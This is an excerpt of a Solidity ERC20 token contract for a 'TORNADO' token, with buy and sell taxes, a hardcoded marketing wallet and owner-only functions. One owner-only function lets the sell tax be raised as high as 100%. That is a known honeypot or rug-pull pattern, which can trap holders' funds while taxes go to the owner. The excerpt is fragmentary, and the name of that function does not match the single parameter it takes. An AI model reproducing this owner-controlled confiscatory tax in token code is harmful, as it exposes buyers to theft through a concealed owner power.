...
contract LETSGO is ERC20, Ownable {
    // TOKENOMICS
    string private _name = unicode"TORNADO";
    string private _symbol = "TORADO";
    uint8 private _decimals = 18;
    uint256 private _supply = 100000000;
    uint256 public buyTaxForLiquidity = 4;
    uint256 public buyTaxForMarketing = 4;
    uint256 public buyTaxForBurning = 2;
    uint256 public sellTaxForLiquidity = 4;
    uint256 public sellTaxForMarketing = 4;
    uint256 public sellTaxForBurning = 2;
    address public marketingWallet = 0x0f26fBa6674FC182100F204DAcb7E82FaBeDaFE0;    // 41
    uint256 public maxTxAmount = 9999999 * 10**_decimals;
    uint256 public maxWalletAmount = 9999999 * 10**_decimals;
    uint256 private _numTokensSellToAddToLiquidity = 90000 * 10**_decimals;
    ...
    function manSwap() public onlyOwner returns (bool) {
        uint256 contractLiquidityBalance = balanceOf(address(this));
    ...
    function changeSellTaxForLiquidityMarketingBurning(uint256 _sellTaxForMarketing) public onlyOwner returns (bool) {
        require(
            (_sellTaxForMarketing) <= 100,"100");
